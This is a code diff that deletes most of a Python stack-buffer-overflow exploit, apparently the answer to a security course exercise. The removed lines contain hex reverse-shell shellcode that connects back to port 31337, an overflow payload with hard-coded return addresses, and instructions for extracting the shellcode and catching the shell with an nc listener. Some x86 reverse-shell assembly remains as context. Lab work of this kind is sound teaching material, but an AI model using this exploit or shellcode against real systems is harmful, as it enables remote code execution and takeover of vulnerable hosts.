@@ -1,21 +1,3 @@
-from shellcode import shellcode
-from struct import pack
-
-buf_addr = pack("<I", 0xbffee328)
-ret_addr_stored = pack("<I", 0xbffeeb3c)
-
-socket =("\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\xb0\x66\x31\xc9\x80\xc1\x01\xc1\xe1\x18\x80\xc1\x7f\x51\x66\x68\x7a\x69\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x89\xd3\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7")
-print socket + shellcode + 'A' * 1956 + buf_addr + ret_addr_stored
-
-# INSTRUCTIONS:
-# gcc -c 2.2.10.S
-# objdump -d ./2.2.10.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-# nc -v -l 31337
-# ./2.2.10 $(python 2.2.10.py)
-
-# CODE (2.2.10.S):
-
-'''
 # With help from https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/
 .global _start
 .section .text
@@ -87,4 +69,3 @@ loop:
 	int $0x80 # call sys_dup2
 	dec %ecx # decrement loop counter in ecx
 	jns loop
-'''
